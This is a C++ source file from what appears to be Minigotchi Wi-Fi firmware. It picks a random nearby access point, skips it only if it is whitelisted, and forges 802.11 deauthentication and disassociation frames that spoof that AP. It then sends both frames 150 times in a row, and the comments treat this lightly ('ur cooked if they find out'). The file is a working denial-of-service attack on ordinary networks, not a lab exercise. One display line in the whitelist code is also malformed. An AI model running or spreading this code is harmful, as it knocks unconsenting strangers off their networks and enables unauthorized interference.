/**
 * deauth.cpp: handles the deauth of a local AP
*/

#include "deauth.h"

/** developer note:
 *
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
*/

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";

/** developer note:
 * 
 * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
 * 
*/

uint8_t Deauth::deauthFrame[26];
uint8_t Deauth::disassociateFrame[26];

void Deauth::add(const std::string& bssids) {
    std::stringstream ss(bssids);
    std::string token;

    // seperate info and whitelist
    while (std::getline(ss, token, ',')) {
        // trim out whitespace
        token.erase(0, token.find_first_not_of(" \t\r\n"));
        token.erase(token.find_last_not_of(" \t\r\n") + 1);

        // add to whitelist
        Serial.print("('-') Adding ");
        Serial.print(token.c_str());
        Serial.println(" to the whitelist");
        Display::cleanDisplayFace("('-')");
        Display::attachSmallText("Adding " + (String) + " to the whitelist");
        whitelist.push_back(token.c_str());
    }
}

void Deauth::list() {
    for (const auto& bssid : Config::whitelist) {
        Deauth::add(bssid);
    }
}

bool Deauth::send(uint8 *buf, int len, bool sys_seq) {
    bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
    delay(102);

    return sent;
}

void Deauth::select() {
    // cool animation
    for (int i = 0; i < 5; ++i) {
        Serial.println("(0-o) Scanning for APs.");
        Display::cleanDisplayFace("(0-o)");
        Display::attachSmallText("Scanning  for APs.");
        delay(500);
        Serial.println("(o-0) Scanning for APs..");
        Display::cleanDisplayFace("(o-0)");
        Display::attachSmallText("Scanning  for APs..");
        delay(500);
        Serial.println("(0-o) Scanning for APs...");
        Display::cleanDisplayFace("(0-o)");
        Display::attachSmallText("Scanning  for APs...");
        delay(500);
        Serial.println(" ");
        delay(500);
    }

    delay(1000);

    // stop and scan
    Minigotchi::monStop();
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
            Display::cleanDisplayFace("('-')");
            Display::attachSmallText("Selected AP is in the whitelist. Skipping deauthentication...");
            return;
        }
        Serial.print("('-') Selected random AP: ");
        Serial.println(randomAP.c_str());
        Serial.println(" ");
        Display::cleanDisplayFace("('-')");
        Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
        delay(1000);
        
        /** developer note:
         * 
         * here we will create the deauth frame using the header, 
         * as we find the AP in question we also generate the required information for it as well...
         * 
        */

        // clear out exisitng frame...
        std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
        std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);

        Deauth::deauthFrame[0] = 0xC0; // type
        Deauth::deauthFrame[1] = 0x00; // subtype
        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)

        Deauth::disassociateFrame[0] = 0xA0; // type
        Deauth::disassociateFrame[1] = 0x00; // subtype
        Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
        Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)

        // bssid
        uint8_t* apBssid = WiFi.BSSID(randomIndex);

         // set our mac address
        uint8_t mac[WL_MAC_ADDR_LENGTH];
        WiFi.macAddress(mac);

        // broadcast address
        uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        /** developer note:
        * 
        * addr1: reciever addr
        * addr2: sender addr
        * addr3: filtering addr
        * 
        */

        // copy our mac(s) to header
        std::copy(broadcastAddr, broadcastAddr + sizeof(broadcastAddr), Deauth::deauthFrame + 4);
        // std::copy(mac, mac + sizeof(mac), Deauth::deauthFrame + 10);
        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 10);
        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 16);

        std::copy(broadcastAddr, broadcastAddr + sizeof(apBssid), Deauth::disassociateFrame + 4);
        // std::copy(mac, mac + sizeof(mac), Deauth::disassociateFrame + 10);
        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 10);
        std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 16);
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
        Serial.println(" ");
        Display::cleanDisplayFace("(;-;)");
        Display::attachSmallText("No access points found.");
        delay(1000);
    }
}

void Deauth::deauth() {
    if (Config::deauth) {
       // select AP
        Deauth::select();

        if (randomAP.length() > 0) {
            Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
            Serial.println(" ");
            Display::cleanDisplayFace("(>-<)");
            Display::attachSmallText("Begin deauth-attack on AP...");
            delay(1000);
            // define the attack
            if (!running) {
                start();
            } else {
                Serial.println("('-') Attack is already running.");
                Serial.println(" ");
                Display::cleanDisplayFace("('-')");
                Display::attachSmallText(" Attack is already running.");
                delay(1000);
            }
        } else {
            // ok why did you modify the deauth function? i literally told you to not do that...
            Serial.println("(X-X) No access point selected. Use select() first.");
            Serial.println("('-') Told you so!");
            Serial.println(" ");
            Display::cleanDisplayFace("(X-X)");
            Display::attachSmallText("No access point selected. Use select() first.");
            delay(1000);
            Display::cleanDisplayFace("('-')");
            Display::attachSmallText("Told you so!");
            delay(1000);
        }
    } else {
        // do nothing if deauthing is disabled
    }
}

void Deauth::start() {
    running = true;
    int deauthFrameSize = sizeof(deauthFrame);
    int disassociateFrameSize = sizeof(disassociateFrame);
    int packets = 0;
    unsigned long startTime = millis();

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < 150; ++i) {
        if (Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) && Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)) {
            packets++;
            float pps = packets / (float)(millis() - startTime) * 1000;

            // show pps
            if (!isinf(pps)) {
                Serial.print("(>-<) Packets per second: ");
                Serial.print(pps);
                Serial.println(" pkt/s");
                Display::cleanDisplayFace("(>-<)");
                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s");
            } 
        } else {
            Serial.println("(X-X) Packet failed to send!");
        }
    }

    Serial.println(" ");
    Serial.println("(^-^) Attack finished!");
    Serial.println(" ");
    Display::cleanDisplayFace("(^-^)");
    Display::attachSmallText("Attack finished!");
    running = false;
}
